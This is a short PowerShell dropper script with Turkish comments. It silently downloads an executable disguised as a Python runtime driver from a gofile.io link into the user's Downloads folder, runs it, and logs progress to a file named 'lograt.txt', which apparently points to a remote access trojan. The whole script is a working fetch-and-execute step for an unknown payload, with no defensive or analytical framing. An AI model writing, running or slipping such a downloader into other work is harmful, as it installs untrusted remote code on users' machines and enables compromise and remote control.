# Ayarlar
$exeUrl = "https://cold3.gofile.io/download/web/eb0e07d2-e698-48f9-8fa7-20a9f86b59de/PythonRuntimeDriver.exe"
$localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"

# Log fonksiyonu
function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

try {
    Log-Message "BITS transfer başlatılıyor..."

    # Sessiz, stabil indirme başlasın
    Start-BitsTransfer -Source $exeUrl -Destination $localPath -ErrorAction Stop

    Log-Message "İndirme tamamlandı: $localPath"

    # Dosyayı çalıştır
    Log-Message "Dosya çalıştırılıyor..."
    Start-Process -FilePath $localPath -WindowStyle Normal
} catch {
    Log-Message "HATA: $($_.Exception.Message)"
}
